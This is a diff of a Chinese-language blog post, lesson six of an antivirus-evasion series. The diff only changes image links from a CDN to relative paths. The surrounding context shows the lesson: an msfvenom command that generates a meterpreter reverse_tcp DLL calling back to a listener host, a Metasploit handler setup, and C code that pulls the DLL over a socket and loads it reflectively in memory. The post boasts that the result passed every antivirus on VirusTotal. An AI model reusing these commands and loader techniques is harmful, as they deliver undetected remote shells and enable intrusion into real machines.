@@ -95,8 +95,8 @@ VOID msg(VOID){
 	return;
 }
 </code></pre><p>这里我采用了Def文件来进行导出：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png" alt="2020-01-03-13-05-56"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png" alt="2020-01-03-13-06-15"></p>
+<p><img src="../../../static/images/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png" alt="2020-01-03-13-05-56"></p>
+<p><img src="../../../static/images/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png" alt="2020-01-03-13-06-15"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
@@ -123,7 +123,7 @@ VOID msg(VOID){
 <li>释放MemoryModule句柄</li>
 </ol>
 <p>这里我将MemoryModule项目代码放入当前项目：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/824455c4-4f5f-11ec-b777-00d861bf4abb.png" alt="2020-01-03-13-06-38"></p>
+<p><img src="../../../static/images/824455c4-4f5f-11ec-b777-00d861bf4abb.png" alt="2020-01-03-13-06-38"></p>
 <p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p>
 <p>加载代码</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
@@ -191,7 +191,7 @@ VOID msg(VOID){
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> GetLastError();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>运行结果：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png" alt="2020-01-03-13-06-52"></p>
+<p><img src="../../../static/images/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png" alt="2020-01-03-13-06-52"></p>
 <p>能够看到，成功加载并执行了msg函数。</p>
 <h2 id="0x03-反射dll与msf联动">0x03 反射DLL与MSF联动</h2>
 <p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p>
@@ -199,7 +199,7 @@ VOID msg(VOID){
 <p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p>
 <h3 id="生成dll">生成DLL</h3>
 <pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/82b32ae4-4f5f-11ec-80f1-00d861bf4abb.png" alt="2020-01-03-13-07-02"></p>
+</code></pre><p><img src="../../../static/images/82b32ae4-4f5f-11ec-80f1-00d861bf4abb.png" alt="2020-01-03-13-07-02"></p>
 <p><strong>生成了一个5120字节的DLL</strong></p>
 <p>然后设置一下MSF DLL发射器：</p>
 <pre tabindex="0"><code>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.170.138 -P 8899
@@ -337,12 +337,12 @@ msf5 exploit(multi/handler) &gt;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
 <p>实现效果如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/82f319d8-4f5f-11ec-a688-00d861bf4abb.png" alt="2020-01-03-13-07-19"></p>
+<p><img src="../../../static/images/82f319d8-4f5f-11ec-a688-00d861bf4abb.png" alt="2020-01-03-13-07-19"></p>
 <h2 id="0x04-总结">0x04 总结</h2>
 <p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p>
 <p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p>
 <p>老样子，V站查杀一下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/832a3850-4f5f-11ec-86bb-00d861bf4abb.png" alt="2020-01-03-13-07-29"></p>
+<p><img src="../../../static/images/832a3850-4f5f-11ec-86bb-00d861bf4abb.png" alt="2020-01-03-13-07-29"></p>
 <p>挑战了全球的AV，全部通过</p>
 <p><a href="https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection">https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</a></p>
 <p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的&quot;不可能&quot;。</p>
